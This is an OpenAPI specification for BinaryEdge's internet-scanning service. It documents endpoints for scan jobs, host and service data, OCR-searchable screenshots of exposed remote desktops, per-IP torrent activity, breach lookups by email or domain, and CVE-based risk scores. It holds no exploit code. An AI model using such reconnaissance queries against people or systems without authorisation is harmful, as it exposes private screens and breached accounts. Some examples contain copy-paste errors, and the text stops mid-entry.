@@ -1,0 +1,2257 @@
+openapi: 3.0.0
+
+info:
+  title: "BinaryEdge's API V1 Enterprise"
+  version: "1.0.0"
+  description: "[BinaryEdge](https://www.binaryedge.io/) is Cybersecurity/Data Science company that focuses its effort on acquiring, analyzing and classifying internet wide data. We have developed a platform - [40fy](https://app.binaryedge.io/) that allows us and our customers to gather several data points from exposed servers online.\n\n The API provides access to that scanning platform, for your own usage, along with access to our curated databases so that you can do querying and analytics on our worldwide (constantly updated) collected data."
+  
+servers:
+  - description: "API V1"
+    url: "https://api.binaryedge.io/v1"
+
+paths:
+
+  /tasks:
+    get:
+      tags:
+        - Tasks
+      summary: "List Requested Jobs"
+      description: "Retrieve a list of the latest requested jobs. This includes: \n - 'status': Status of the job. Where status can be: \n   - 'requested': Job was requested successfully; \n   - 'revoked': Job was revoked by user; \n   -  'success': Job completed successfully; \n   -  'failed': Job completed, but did not finish. \n - 'requested_at': Time the job was requested; \n - 'finished_at': Time the job finished; \n - 'job_id': ID of the requested job; \n - 'options': Job configuration options."
+      security:
+        - Token: []
+        
+      responses:
+        '200':
+          description: "Returned the tasks object."
+          content: 
+            application/json:  
+              schema:
+                example:
+                  - status: Success
+                    requested_at: '2017-04-10T17:44:58.636681+00:00'
+                    description: Job Description 1
+                    finished_at: '2017-04-10T17:47:46.534544+00:00'
+                    options:
+                      - targets:
+                          - xxx.xxx.xxx.xxx
+                        ports:
+                          - modules:
+                              - service
+                              - service-simple
+                              - ssh
+                            port: '80,8080'
+                    job_id: 32637b98-8f01-46eb-a1f7-3eaee18ab1d5
+                  - status: Success
+                    requested_at: '2017-04-10T17:39:53.066632+00:00'
+                    description: Test web
+                    finished_at: '2017-04-10T17:41:57.919141+00:00'
+                    options:
+                      - targets:
+                          - example.org
+                        ports:
+                          - config:
+                              https: true
+                            modules:
+                              - web
+                            port: 443
+                    job_id: 73364d62-d768-4dbd-9947-aba2a453dfb7
+                  
+        
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+    post:
+      tags:
+        - Tasks
+      summary: "Create Scan Job"
+      description: "Create a On-Demand Job. You can specify your own targets, ports, modules and configurations. \n\n Example to run on console: \n\n ``` curl https://api.binaryedge.io/v1/tasks -d '{\"type\":\"scan\", \"description\": \"InsertYourDescriptionHere\", \"options\":[{\"targets\":[\"InsertAnIPAddress/IPNetwork\"], \"ports\":[{\"port\":InsertPort, \"protocol\": \"tcp or udp\", \"modules\": [\"InsertModule\"]}]}]}' -H \"X-Token:<TOKEN>\"```"
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: type
+          description: "\"scan\" or \"grab\". Please refer to [Supported Types](https://docs.binaryedge.io/api-v1/#supported-types);"
+          schema:
+            type: string
+          required: true
+        - in: path
+          name: description
+          description: "Add your own description of the job.\n\n *Note*: Can be a empty string, i.e. \"\";"
+          schema:
+            type: string
+          required: true
+        - in: path
+          name: options
+          description: "Configuration Options for the job, array of JSON objects. One Job can have multiple options"
+          schema:
+            type: string
+          required: true
+      
+      responses:
+        '200':
+          description: "Job Revoked"
+          content: 
+            application/json:  
+              example:
+                message: Job revoked
+     
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+    
+  /tasks/{job_id}/revoke:
+    post:
+      tags:
+        - Tasks
+      summary: "Revoke Job"
+      description: "To cancel a requested job"
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: job_id
+          description: "Job ID"
+          schema:
+            type: string
+          required: true
+      
+      responses:
+        '200':
+          description: "Job Revoked"
+          content: 
+            application/json:  
+              example:
+                message: Job revoked
+     
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+   
+  /replay/{job_id}:
+    get:
+      tags:
+        - Tasks
+      summary: "Replay Job"
+      description: "To retrieve the results from a previously requested scan job, you can replay the stream with this endpoint."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: job_id
+          description: "Job ID"
+          schema:
+            type: string
+          required: true
+      
+      responses:
+        '200':
+          description: "Return that Job results"
+          content:
+            application/json:
+              example:
+                <Stream results from request job>
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+   
+  /tasks/{job_id}/status:
+    get:
+      tags:
+        - Tasks
+      summary: "Status Endpoint"
+      description: "To check the current status of a Requested job"
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: job_id
+          description: "Job ID"
+          schema:
+            type: string
+          required: true
+      
+      responses:
+        '200':
+          description: "Return Job details status. Where Status can be: \n - \"requested\": Job was requested successfully; \n - \"revoked\": Job was revoked by user; \n - \"success\": Job completed successfully; \n - \"failed\": Job completed, but did not finish."
+          content:
+            application/json:
+              example:
+                status: <STATUS>
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+  
+  /query/ip/historical/{target}:
+    get:
+      tags:
+        - Host
+      summary: ""
+      description: "Details about an Host, with data up to 6 months.\n\n List of events for the specified host, with events for each time that:\n - A port was detected open\n - A service was found running\n - Other modules were successfully executed"
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: target
+          description: "[String] target IP address or CIDR up to /24"
+          schema:
+            type: string
+          required: true
+      
+      responses:
+        '200':
+          description: "Return details of that target"
+          content:
+            application/json:
+              example:
+                origin:
+                  country: uk
+                  module: grabber
+                  ts: 1464558594512
+                  type: service-simple
+                target:
+                  ip: 222.208.xxx.xxx
+                  protocol: tcp
+                  port: 992
+                result:
+                  data:
+                    state:
+                      state: open|filtered
+                    service:
+                      name: telnets
+                      method: table_default
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /query/lastest/{target}:
+    get:
+      tags:
+        - Host
+      summary: ""
+      description: "Details about an Host. List of recent events for the specified host, including details of exposed ports and services."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: target
+          description: "[String] target IP address or CIDR up to /24"
+          schema:
+            type: string
+          required: true
+      
+      responses:
+        '200':
+          description: "Return details of that host"
+          content: 
+            application/json:  
+              example:
+                origin:
+                  country: uk
+                  module: grabber
+                  ts: 1464558594512
+                  type: service-simple
+                target:
+                  ip: 222.208.xxx.xxx
+                  protocol: tcp
+                  port: 992
+                result:
+                  data:
+                    state:
+                      state: open|filtered
+                    service:
+                      name: telnets
+                      method: table_default
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+  
+  /query/search:
+    get:
+      tags:
+        - Host
+      summary: ""
+      description: "Events based on a Query. List of recent events for the given query, including details of exposed ports and services. Can be used with [specific parameters](https://docs.binaryedge.io/image-search/) and/or full-text search."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: query
+          name: query
+          schema:
+            type: string
+          description: "[String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events.\n See [specific parameters](https://docs.binaryedge.io/image-search/) for details on what parameters can be used."
+          required: true
+      
+      responses:
+        '200':
+          description: "Return hosts details of that search"
+          content:
+            application/json:
+              example:
+                origin:
+                  type: service-simple
+                  ts: 1552128473582
+                  module: grabber
+                  port: 37188
+                  country: uk
+                  ip: xxx.xxx.xxx.xxx
+                target:
+                  ip: xxx.xxx.xxx.xxx
+                  protocol: tcp
+                  port: 9100
+                result:
+                  data:
+                    state:
+                      state: open
+                    service:
+                      version: 5.0.45-community-nt
+                      cpe:
+                        - 'cpe:/a:mysql:mysql:5.0.45-community-nt'
+                      name: mysql
+                      banner: 'A\x00\x00\x00\n5.0.45-community-nt\x00\xe0\x14\x00\x00jEZrR"QS\x00,\xa2\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/,0Msz,gFdFr\x00'
+                      method: probe_matching
+                      product: MySQL
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+  
+  /query/image/ip/{target}:
+    get:
+      tags:
+        - Image
+      summary: ""
+      description: "Details about Remote Desktops found on an Host. List of screenshots and details extracted from them for the specified host, including OCR and whether faces were found or not, with data up to 2 months."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: target
+          description: "[String] target IP address or CIDR up to /24"
+          schema:
+            type: string
+          required: true
+        - in: query
+          name: ocr
+          description: "[any] if present, shows an additional \"words\" field, which is a list of words obtained via OCR"
+          schema:
+            type: string
+        - in: query
+          name: page
+          description: "[int] Number of the page"
+          schema:
+            type: integer
+            default: 1
+        - in: query
+          name: pagesize
+          description: "[int] Number of results per page"
+          schema:
+            type: integer
+            default: 100
+
+      responses:
+        '200':
+          description: "Return Image results"
+          content:
+            application/json:
+              example:
+                total_records: 3
+                page: 1
+                events:
+                  - image_id: 993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df
+                    asn: 5432
+                    url: 'https://d1ngxp4ef6grqi.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg'
+                    width: 1280
+                    as_name: Proximus NV
+                    thumb: 'https://d3f9qnon04ymh2.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg'
+                    geoip:
+                      country_code: BE
+                      city_name: null
+                      timezone: Europe/Brussels
+                      longitude: 4.35
+                      country_name: Belgium
+                      latitude: 50.85
+                      location:
+                        - 4.35
+                        - 50.85
+                    tags:
+                      - VNC
+                    height: 800
+                    port: 5900
+                    country: BE
+                    ip: 81.246.69.245
+                    ts: 1536345753000
+                
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+  
+  /query/image:
+    get:
+      tags:
+        - Image
+      summary: ""
+      description: "List of Remote Desktops found (latest first)."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: query
+          name: page
+          description: "[int] Number of the page"
+          schema:
+            type: integer
+            default: 1
+        - in: query
+          name: pagesize
+          description: "[int] Number of results per page"
+          schema:
+            type: integer
+            default: 100
+      
+      responses:
+        '200':
+          description: "Return Image details results"
+          content:
+            application/json:
+              example:
+                total_records: 3
+                page: 1
+                events:
+                  - url: 'https://d1ngxp4ef6grqi.cloudfront.net/9034b457b18ddbe236915407063215f201e214c24cb11a3c6287ae58dd24.jpg'
+                    thumb: 'https://d3f9qnon04ymh2.cloudfront.net/9034b457b18ddbe236915407063215f201e214c24cb11a3c6287ae58dd24.jpg'
+                    image_id: 9034b457b18ddbe236915407063215f201e214c24cb11a3c6287ae58dd24
+                  - url: 'https://d1ngxp4ef6grqi.cloudfront.net/9035b057b197dcfe338f5a1e08381cf90a851da945b6163b618bae52.jpg'
+                    thumb: 'https://d3f9qnon04ymh2.cloudfront.net/9035b057b197dcfe338f5a1e08381cf90a851da945b6163b618bae52.jpg'
+                    image_id: 9035b057b197dcfe338f5a1e08381cf90a851da945b6163b618bae52
+                  - url: 'https://d1ngxp4ef6grqi.cloudfront.net/903db057b788c0f929935f1b08381cf90a851da945b6163b618bab56.jpg'
+                    thumb: 'https://d3f9qnon04ymh2.cloudfront.net/903db057b788c0f929935f1b08381cf90a851da945b6163b618bab56.jpg'
+                    image_id: 903db057b788c0f929935f1b08381cf90a851da945b6163b618bab56
+                
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+ 
+  /query/image/{image_id}:
+    get:
+      tags:
+        - Image
+      summary: ""
+      description: "Details about a specific Remote Desktop."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: image_id
+          description: "[String] image ID of the image you want the details from."
+          schema:
+            type: string
+          required: true
+        - in: query
+          name: ocr
+          description: "[any] if present, shows an additional \"words\" field, which is a list of words obtained via OCR"
+          schema:
+            type: string
+
+      responses:
+        '200':
+          description: "Return Image results"
+          content:
+            application/json:
+              example:
+                total_records: 3
+                page: 1
+                events:
+                  - image_id: 993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df
+                    asn: 5432
+                    url: 'https://d1ngxp4ef6grqi.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg'
+                    width: 1280
+                    as_name: Proximus NV
+                    thumb: 'https://d3f9qnon04ymh2.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg'
+                    geoip:
+                      country_code: BE
+                      city_name: null
+                      timezone: Europe/Brussels
+                      longitude: 4.35
+                      country_name: Belgium
+                      latitude: 50.85
+                      location:
+                        - 4.35
+                        - 50.85
+                    tags:
+                      - VNC
+                    height: 800
+                    port: 5900
+                    country: BE
+                    ip: 81.246.69.245
+                    ts: 1536345753000
+                
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+          
+  /query/image/search:
+    get:
+      tags:
+        - Image
+      summary: ""
+      description: "Remote Desktops based on a Query. List of screenshots and details extracted from them for the given query, including OCR and whether faces were found or not. Can be used with specific parameters and/or full-text search."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: query
+          name: query
+          schema:
+            type: string
+          description: "String used to query our data. If no filters are used, it will perform a full-text search on the entire events.\n See [Search Parameters](https://docs.binaryedge.io/image-search/) for details on what parameters can be used."
+          required: true
+        - in: query
+          name: page
+          description: "[int] Number of the page"
+          schema:
+            type: integer
+            default: 1
+        - in: query
+          name: pagesize
+          description: "[int] Number of results per page"
+          schema:
+            type: integer
+            default: 100
+      
+      responses:
+        '200':
+          description: "Return Image results."
+          content:
+            application/json:
+              example:
+                total_records: 3
+                page: 1
+                query:
+                  ip: 58.56.83.212
+                  port: 5900
+                  country: CN
+                  face: true
+                  tag: vnc
+                  logo: windows
+                  word: confidential OR private
+                events:
+                  - url: 'https://d1ngxp4ef6grqi.cloudfront.net/903cb557b597d9fa29905e1908381cf90b851da945b711366686af50.jpg'
+                    thumb: 'https://d3f9qnon04ymh2.cloudfront.net/903cb557b597d9fa29905e1908381cf90b851da945b711366686af50.jpg'
+                    image_id: 903cb557b597d9fa29905e1908381cf90b851da945b711366686af50
+                  - url: 'https://d1ngxp4ef6grqi.cloudfront.net/933db157b280dfe236975e07073315f201e215c24cb11a3d658ba054dd21.jpg'
+                    thumb: 'https://d3f9qnon04ymh2.cloudfront.net/933db157b280dfe236975e07073315f201e215c24cb11a3d658ba054dd21.jpg'
+                    image_id: 933db157b280dfe236975e07073315f201e215c24cb11a3d658ba054dd21
+                  - url: 'https://d1ngxp4ef6grqi.cloudfront.net/9735ad48b289c0f9338f5c1908381cf90b851da945b712386387ac59.jpg'
+                    thumb: 'https://d3f9qnon04ymh2.cloudfront.net/9735ad48b289c0f9338f5c1908381cf90b851da945b712386387ac59.jpg'
+                    image_id: 9735ad48b289c0f9338f5c1908381cf90b851da945b712386387ac59
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /query/image/search/similar:
+    get:
+      tags:
+        - Image
+      summary: ""
+      description: "List of Remote Desktops that are similar to another Remote Desktop.\n\n **Note:** This option cannot be used together with the previous ones."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: query
+          name: similar
+          schema:
+            type: string
+          description: "[String] Image ID of the image you wish to compare."
+          required: true
+      
+      responses:
+        '200':
+          description: "Return Image results."
+          content:
+            application/json:
+              example:
+                total_records: 3
+                page: 1
+                events:
+                  - url: 'https://d1ngxp4ef6grqi.cloudfront.net/9538ad4ab697d6e236935913013817f96deb18aa45b11a3d638aab.jpg'
+                    thumb: 'https://d3f9qnon04ymh2.cloudfront.net/9538ad4ab697d6e236935913013817f96deb18aa45b11a3d638aab.jpg'
+                    score: 26.099752
+                    image_id: 9538ad4ab697d6e236935913013817f96deb18aa45b11a3d638aab
+                    dist: 0
+                  - url: 'https://d1ngxp4ef6grqi.cloudfront.net/9538ad4ab697d6e236935e13013817f96deb18aa4abd133f638ba8.jpg'
+                    thumb: 'https://d3f9qnon04ymh2.cloudfront.net/9538ad4ab697d6e236935e13013817f96deb18aa4abd133f638ba8.jpg'
+                    score: 26.01995
+                    image_id: 9538ad4ab697d6e236935e13013817f96deb18aa4abd133f638ba8
+                    dist: 0
+                  - url: 'https://d1ngxp4ef6grqi.cloudfront.net/9538ad4ab697d6e236935c13013817f96deb18aa4ab2143c6087a9.jpg'
+                    thumb: 'https://d3f9qnon04ymh2.cloudfront.net/9538ad4ab697d6e236935c13013817f96deb18aa4ab2143c6087a9.jpg'
+                    score: 26.01995
+                    image_id: 9538ad4ab697d6e236935c13013817f96deb18aa4ab2143c6087a9
+                    dist: 0
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /query/torrent/{target}:
+    get:
+      tags:
+        - Torrent
+      summary: ""
+      description: "Details about torrents transferred by an Host, with data up to 6 months.\n\n List of torrent events for the specified host, with events for each time that a new transfer was detected on the DHT. See [Torrent Data](https://docs.binaryedge.io/torrent/) for more details."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: target
+          description: "[String] target IP address or CIDR up to /24"
+          schema:
+            type: string
+          required: true
+      
+      responses:
+        '200':
+          description: "Return Torrent results"
+          content:
+            application/json:
+              example:
+                origin:
+                  type: peer
+                  module: torrent
+                  ts: 1491827676263
+                node:
+                  ip: 219.88.xxx.xxx
+                  port: 25923
+                peer:
+                  ip: 222.208.xxx.xxx
+                  port: 30236
+                torrent:
+                  infohash: cbe45addbb48c07ef6451bd3bee326d5cd82538f
+                  name: NCIS Los Angeles S08E20 HDTV x264-LOL EZTV
+                  source: EZTV
+                  category: TV Show
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /query/torrent/latest/{target}:
+    get:
+      tags:
+        - Torrent
+      summary: ""
+      description: "Details about torrents transferred by an Host. List of recent torrent events for the specified host, including details of the peer and torrent. See [Torrent Data](https://docs.binaryedge.io/torrent/) for more details.\n\n **Note:** Available for paid subscriptions only."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: target
+          description: "[String] target IP address or CIDR up to /24"
+          schema:
+            type: string
+          required: true
+      
+      responses:
+        '200':
+          description: "Return Torrent results"
+          content:
+            application/json:
+              example:
+                origin:
+                  type: peer
+                  module: torrent
+                  ts: 1491827676263
+                node:
+                  ip: 219.88.xxx.xxx
+                  port: 25923
+                peer:
+                  ip: 222.208.xxx.xxx
+                  port: 30236
+                torrent:
+                  infohash: cbe45addbb48c07ef6451bd3bee326d5cd82538f
+                  name: NCIS Los Angeles S08E20 HDTV x264-LOL EZTV
+                  source: EZTV
+                  category: TV Show
+                
+  
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /dataleaks/check/{email}:
+    get:
+      tags:
+        - Dataleak
+      summary: ""
+      description: "Allows you to search across multiple data breaches to see if any of your email addresses has been compromised."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: email
+          description: "[String] Verify which dataleaks affect the target email."
+          schema:
+            type: string
+          required: true
+      
+      responses:
+        '200':
+          description: "Return Dataleaks results"
+          content:
+            application/json:
+              example:
+                total: 19
+                events:
+                  - antipublic
+                  - ashleymadison
+                  - breachcompilation
+                  - cannabis
+                  - customerslive
+                  - dropbox
+                  - exploitin
+                  - fling
+                  - imesh
+                  - lastfm
+                  - linkedin
+                  - mate1
+                  - neopets
+                  - pastebin
+                  - rsboards
+                  - tianya
+                  - torrentinvites
+                  - tumblr
+                  - vk
+                query: user@example.com
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /dataleaks/organization/{domain}:
+    get:
+      tags:
+        - Dataleak
+      summary: ""
+      description: "Verify how many emails are affected by dataleaks for a specific domain."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: domain
+          description: "[String] Verify which dataleaks affect the target domain"
+          schema:
+            type: string
+          required: true
+        - in: query
+          name: csv
+          schema:
+            type: string
+          description: "[any] if present, return results in CSV format"
+        - in: query
+          name: jsonl
+          schema:
+            type: string
+          description: "[any] if present, return results in JSON lines format"  
+        - in: query
+          name: page
+          description: "[Int] Optional. Default 1"
+          schema:
+            type: integer
+            default: 1
+        - in: query
+          name: pagesize
+          description: "[Int] Optional. Default 100"
+          schema:
+            type: integer
+            default: 100
+      
+      responses:
+        '200':
+          description: "Return Dataleaks results"
+          content:
+            application/json:
+              example:
+                events:
+                  - user: user
+                    leak: ashleymadison
+                total_records: 1
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /dataleaks/leaks:
+    get:
+      tags:
+        - Dataleak
+      summary: ""
+      description: "Get all available information about the dataleaks our platform keeps track."
+      security:
+        - Token: []
+      
+      parameters:
+        - in: query
+          name: leak
+          schema:
+            type: string
+          description: "[String] if present, return information about a specific leak (all leaks if not specified)"
+      
+      responses:
+        '200':
+          description: "Return available Dataleaks."
+          content:
+            application/json:
+              example:
+                ashleymadison:
+                  name: ashleymadison
+                  techname: ashleymadison
+                  year: '2015'
+                  description: Ashley Madison is a canadian online dating service for married/ commited people.
+                  label: Adult
+                  data: 'email addresses, passwords, usernames, dates of birth, names, payment history, phone numbers, physical addresses, website activity'
+                  logo: 'https://s3-eu-west-1.amazonaws.com/be-resources/dataleaks/ashleymadison.jpg'
+                  fullname: Ashley Madison
+                
+        '400':
+          $ref: '#/components/responses/HTTPStatusMessage400'
+                
+        '401':
+          $ref: '#/components/responses/HTTPStatusMessage401'
+
+        '403':
+          $ref: '#/components/responses/HTTPStatusMessage403'
+
+        '404':
+          $ref: '#/components/responses/HTTPStatusMessage404'
+
+  /query/score/ip/{target}:
+    get:
+      tags:
+        - Risk Score
+      summary: ""
+      description: "IP Risk Score. Scoring is based on all information found on our databases regarding an IP and refers to the level of exposure of a target, i.e, the higher the score, the greater the risk of exposure.\n\n More details about scoring can be found on [here](https://github.com/binaryedge/ratemyip-openframework/blob/master/ip-score.md)."
+      security:
+        - Token: []
+        
+      parameters: 
+        - in: path
+          name: target
+          description: "[String] target IP address"
+          schema:
+            type: string
+          required: true
+      
+      responses:
+        '200':
+          description: "Return Rish Score result"
+          content:
+            application/json:
+              example:
+                normalized_ip_score: 97.1
+                normalized_ip_score_detailed:
+                  cve: 100
+                  attack_surface: 100
+                  encryption: 100
+                  rms: 100
+                  storage: 100
+                  web: 100
+                  torrents: 0
+                ip_score_detailed:
+                  cve: 3
+                  attack_surface: 2
+                  encryption: 6
+                  rms: 10
+                  storage: 10
+                  web: 3
+                  torrents: 0
+                results_detailed:
+                  ports:
+                    open:
+                      - 4991
+                      - 6666
+                      - 22
+                      - 443
+                      - 3389
+                      - 5901
+                      - 23
+                      - 80
+                      - 1883
+                      - 27017
+                      - 6379
+                      - 11211
+                      - 9200
+                      - 21
+                      - 8080
+                      - 25
+                      - 3306
+                    score: 17
+                  cve:
+                    result:
+                      - port: 4991
+                        cve:
+                          - cpe: 'cpe:/a:igor_sysoev:nginx:1.2.6'
+                            cve_list:
+                              - cve: CVE-2013-2070
+                                cvss: 5.8
+                              - cve: CVE-2013-4547
+                                cvss: 7.5
+                              - cve: CVE-2014-3616
+                                cvss: 4.3
+                              - cve: CVE-2016-1247
+                                cvss: 7.2
+                              - cve: CVE-2016-0742
+                                cvss: 5
+                              - cve: CVE-2016-0746
+                                cvss: 7.5
+                              - cve: CVE-2016-0747
+                                cvss: 5
+                              - cve: CVE-2016-4450
+                                cvss: 5
+                            score: 47.3
+                        score: 47.3
+                      - port: 6666
+                        cve:
+                          product: Postgres-XC
+                          version: '1.1'
+                          cve_list: []
+                          score: 0
+                        score: 0
+                      - port: 6666
+                        cve:
+                          - cpe: 'cpe:/a:mysql:mysql:5.5.18.1'
+                            cve_list:
+                              - cve: CVE-2005-1274
+                                cvss: 10
+                              - cve: CVE-2005-0081
+                                cvss: 5
+                              - cve: CVE-2005-0082
+                                cvss: 5
+                              - cve: CVE-2005-0684
+                                cvss: 10
+                              - cve: CVE-2012-2750
+                                cvss: 10
+                              - cve: CVE-2012-4414
+                                cvss: 6.5
+                              - cve: CVE-2011-2262
+                                cvss: 5
+                              - cve: CVE-2012-0112
+                                cvss: 3.5
+                              - cve: CVE-2012-0113
+                                cvss: 5.5
+                              - cve: CVE-2012-0115
+                                cvss: 4
+                              - cve: CVE-2012-0116
+                                cvss: 4.9
+                              - cve: CVE-2012-0117
+                                cvss: 3.5
+                              - cve: CVE-2012-0118
+                                cvss: 4.9
+                              - cve: CVE-2012-0119
+                                cvss: 4
+                              - cve: CVE-2012-0120
+                                cvss: 4
+                              - cve: CVE-2012-0553
+                                cvss: 7.5
+                              - cve: CVE-2012-2102
+                                cvss: 3.5
+                              - cve: CVE-2012-2122
+                                cvss: 5.1
+                              - cve: CVE-2012-2749
+                                cvss: 4
+                              - cve: CVE-2013-1492
+                                cvss: 7.5
+                              - cve: CVE-2015-3152
+                                cvss: 4.3
+                              - cve: CVE-2016-0610
+                                cvss: 3.5
+                              - cve: CVE-2016-0616
+                                cvss: 4
+                              - cve: CVE-2013-5807
+                                cvss: 4.9
+                              - cve: CVE-2016-6664
+                                cvss: 6.9
+                              - cve: CVE-2004-0931
+                                cvss: 5
+                              - cve: CVE-2017-3302
+                                cvss: 5
+                              - cve: CVE-2016-7412
+                                cvss: 6.8
+                              - cve: CVE-2012-5627
+                                cvss: 4
+                              - cve: CVE-2014-0001
+                                cvss: 7.5
+                              - cve: CVE-2016-6662
+                                cvss: 10
+                              - cve: CVE-2009-4833
+                                cvss: 5.8
+                              - cve: CVE-2012-0485
+                                cvss: 4
+                              - cve: CVE-2012-0486
+                                cvss: 5
+                              - cve: CVE-2012-0487
+                                cvss: 4
+                              - cve: CVE-2012-0488
+                                cvss: 4
+                              - cve: CVE-2012-0489
+                                cvss: 4
+                              - cve: CVE-2012-0491
+                                cvss: 4
+                              - cve: CVE-2012-0492
+                                cvss: 2.1
+                              - cve: CVE-2012-0493
+                                cvss: 2.1
+                              - cve: CVE-2012-0494
+                                cvss: 1.7
+                              - cve: CVE-2012-0495
+                                cvss: 4
+                              - cve: CVE-2012-0496
+                                cvss: 4.3
+                              - cve: CVE-2012-5611
+                                cvss: 6.5
+                              - cve: CVE-2012-5612
+                                cvss: 6.5
+                              - cve: CVE-2016-6663
+                                cvss: 4.4
+                              - cve: CVE-2005-1636
+                                cvss: 4.6
+                            score: 242.3
+                        score: 242.3
+                      - port: 8080
+                        cve:
+                          - cpe: 'cpe:/a:indy:httpd:13.2.3.2235'
+                            cve_list: []
+                            score: 0
+                        score: 0
+                      - port: 25
+                        cve:
